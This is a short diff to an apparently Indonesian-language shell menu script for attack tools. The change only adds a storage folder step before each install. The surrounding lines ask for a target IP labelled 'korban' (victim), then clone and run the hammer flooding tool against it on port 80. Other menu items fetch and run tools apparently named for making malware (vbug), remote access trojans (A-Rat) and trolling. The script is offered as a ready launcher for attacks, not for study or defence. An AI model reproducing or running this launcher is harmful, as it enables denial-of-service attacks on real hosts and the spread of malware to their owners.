@@ -103,6 +103,8 @@ echo
 echo
 echo
 read -p "MASUKAN IP TARGET >>>>>> " korban;
+mkdir penyimpanan
+cd penyimpanan
 git clone https://github.com/cyweb/hammer
 cd hammer
 python hammer.py -s $korban -p 80 -t 135
@@ -153,6 +155,8 @@ echo
 echo
 echo
 read -p "MASUKAN IP TARGET >>>>>> " korban;
+mkdir penyimpanan
+cd penyimpanan
 git clone https://github.com/cyweb/hammer
 cd hammer
 python hammer.py -s $korban -p 80 -t 135
@@ -196,6 +200,8 @@ then
 clear
 figlet -f slant "INSTAL KEPERLUAN"|lolcat
 pkg install python2
+mkdir penyimpanan
+cd penyimpanan
 git clone https://github.com/Junior60/vbug.git
 cd vbug
 python2 vbug.py
@@ -294,6 +300,8 @@ then
 clear
 figlet -f slant "INSTAL KEPERLUAN"|lolcat
 pkg install python2
+mkdir penyimpanan
+cd penyimpanan
 git clone https://github.com/Xi4u7/A-Rat.git
 cd A-Rat
 python2 A-Rat.py
@@ -346,6 +354,8 @@ then
 clear
 figlet -f slant "INSTALL KEPERLUAN"|lolcat
 pkg install curl
+mkdir penyimpanan
+cd penyimpanan
 git clone https://github.com/zlucifer/troll_project.git
 cd troll_project
 bash troll.sh
